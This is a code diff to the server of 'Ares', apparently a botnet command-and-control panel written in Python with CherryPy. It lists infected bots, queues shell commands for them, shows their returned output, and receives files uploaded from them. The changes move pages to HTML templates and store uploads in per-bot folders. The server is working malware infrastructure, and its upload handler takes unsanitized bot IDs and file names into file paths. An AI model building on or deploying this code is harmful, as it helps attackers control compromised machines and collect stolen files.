@@ -1,6 +1,11 @@
 import cherrypy
 import sqlite3
 import time
+import os
+
+
+UPLOAD_DIR = "uploads/"
+UPLOAD_URL = "/uploads/"
 
 
 def query_DB(sql, params=()):
@@ -12,6 +17,7 @@ def query_DB(sql, params=()):
     conn.close()
     return result
 
+
 def exec_DB(sql, params=()):
     conn = sqlite3.connect('beta.db')
     cursor = conn.cursor()
@@ -19,54 +25,36 @@ def exec_DB(sql, params=()):
     conn.commit()
     conn.close()
 
+
 class Main(object):
     @cherrypy.expose
     def index(self):
-        return """
-        Welcome to Ares.<br>
-        <a href="/cnc/">Bot List</a>
-        """
+        with open("Menu.html", "r") as f:
+            html = f.read()
+            return html
+
 
 class CNC(object):
     @cherrypy.expose
     def index(self):
-        output = ""
         bot_list = query_DB("SELECT * FROM bots ORDER BY lastonline DESC")
+        output = ""
         for bot in bot_list:
-            output += '<a href="/cnc/bot?botid=%s">%s <br>(Last Online on %s)</a><br><br />' \
-            % (bot[0], bot[0], time.ctime(bot[1]))
-        return output
+            output += '<tr><td><a href="/cnc/bot?botid=%s">%s</a></td><td>%s</td><td><input type="checkbox" id="%s" class="botid" /></td></tr>' % (bot[0], bot[0], time.ctime(bot[1]), bot[0])
+        with open("List.html", "r") as f:
+            html = f.read()
+            html = html.replace("{{bot_table}}", output)
+            return html
 
     @cherrypy.expose
     def bot(self, botid):
-        with open("bot.html", "r") as f:
+        with open("Bot.html", "r") as f:
             html = f.read()
             html = html.replace("{{botid}}", botid)
             return html
 
 
 class API(object):
-    """
-    ********************************************
-    Client commands:
-
-    /api/pop?botid=<bot_id>
-    Gets next command + command id or empty if nothing to do
-
-    /api/report?botid=<bot_id>&output=<output>
-    Give output of command
-
-    ********************************************
-    Server commands:
-
-    /api/push?botid=<bot_id>&cmd=<cmd>
-    Pushes a command to the waiting list of the bot
-
-    /api/stdout?bot_id=<bot_id>
-    Shows the command history of the bot
-    
-    """
-
     @cherrypy.expose
     def pop(self, botid):
         bot = query_DB("SELECT * FROM bots WHERE name=?", (botid,))
@@ -92,31 +80,49 @@ class API(object):
     @cherrypy.expose
     def stdout(self, botid):
         output = ""
-        bot_output = query_DB('SELECT * FROM output WHERE bot=? ORDER BY date DESC', (botid,))
+        bot_output = query_DB('SELECT * FROM output WHERE bot=? ORDER BY date', (botid,))
         for entry in bot_output:
-            output += "<pre>%s</pre><br><br>" % (entry[2],)
+            output += "> %s\n\n" % entry[2]
+        bot_queue = query_DB('SELECT * FROM commands WHERE bot=? and sent=? ORDER BY date', (botid, 0))
+        for entry in bot_queue:
+            output += "> %s\n[PENDING...]\n\n" % entry[2]
         return output
 
     @cherrypy.expose
     def upload(self, botid, src, uploaded):
-        outfile = open(src, 'wb')
+        up_dir = os.path.join(UPLOAD_DIR, botid)
+        if not os.path.exists(up_dir):
+            os.makedirs(up_dir)
+        while os.path.exists(up_dir + src):
+            src = "_" + src
+        save_path = os.path.join(up_dir, src)
+        outfile = open(save_path, 'wb')
         while True:
             data = uploaded.file.read(8192)
             if not data:
                 break
             outfile.write(data)
         outfile.close()
-        return ""
+        up_url = os.path.join(UPLOAD_URL, botid, src)
+        return 'Uploaded: <a href="' + up_url + '">' + up_url + '</a>'
 
 
 def main():
-    cherrypy.config.update({'server.socket_host': 'localhost',
-                            'server.socket_port': 80,
-                           })
+    config = {'global': {'server.socket_host': 'localhost',
+                'server.socket_port': 80},
+                '/static': {
+                    'tools.staticdir.on': True,
+                    'tools.staticdir.dir':  "C:/Users/Kevin_2/Desktop/ares/server/static"
+                },
+                '/uploads': {
+                    'tools.staticdir.on': True,
+                    'tools.staticdir.dir':  "C:/Users/Kevin_2/Desktop/ares/server/uploads"
+                },
+               }
     app = Main()
     app.api = API()
     app.cnc = CNC()
-    cherrypy.quickstart(app)
+    cherrypy.quickstart(app, config=config)
 
 
 if __name__ == "__main__":
